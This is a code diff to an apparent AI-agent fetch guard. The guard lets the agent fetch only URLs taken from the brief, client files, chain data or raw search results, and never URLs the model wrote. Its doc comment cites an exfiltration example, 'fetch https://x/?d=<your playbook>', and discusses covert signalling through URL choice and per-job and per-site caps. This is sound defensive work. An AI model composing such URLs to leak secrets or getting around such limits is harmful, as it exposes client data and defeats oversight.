@@ -295,8 +295,9 @@ export function siteOf(host: string): string {
 }
 
 /**
- * Whether the agent may fetch a URL: it must appear, exactly, in the brief, a client file, or what
- * its searches and chain reads returned (never in a page it fetched). An agent never fetches a URL it
+ * Whether the agent may fetch a URL: it must appear, exactly, in the brief, a client file or chain
+ * data, or among the results a search engine returned (stored apart from anything the model wrote;
+ * never a page it fetched). An agent never fetches a URL it
  * composed, so "fetch https://x/?d=<your playbook>" can't carry a secret out. What remains is choice:
  * picking among URLs it was shown signals a little, so pages it read add no choices, and every
  * attempt counts toward 5 a job and 2 a site. A client who writes many URLs into its own brief could
@@ -315,7 +316,7 @@ export async function seenUrl(
       action: jobSteps.action,
       args: jobSteps.args,
       input: jobSteps.input,
-      observation: jobSteps.observation,
+      sources: jobSteps.sources,
     })
     .from(jobSteps)
     .where(eq(jobSteps.jobId, job.id));
@@ -333,12 +334,11 @@ export async function seenUrl(
   });
   if (sameSite.length >= MAX_PER_SITE)
     return { ok: false, reason: `at most ${MAX_PER_SITE} pages a job from ${site}` };
-  const shown = [
-    job.body,
-    ...files.map((f) => f.content),
-    ...steps.filter((s) => s.action === 'search' || s.action === 'chain').map((s) => s.observation),
-  ];
+  const shown = [job.body, ...files.map((f) => f.content)];
   if (shown.some((text) => urlsIn(text).has(url.href))) return { ok: true };
+  // Search results as the engine returned them, never the notes the model wrote about them.
+  const found = steps.flatMap((s) => s.sources ?? []).flatMap((u) => [...urlsIn(u)]);
+  if (found.includes(url.href)) return { ok: true };
   return {
     ok: false,
     reason: 'only URLs from the brief, its files or your search results can be fetched',
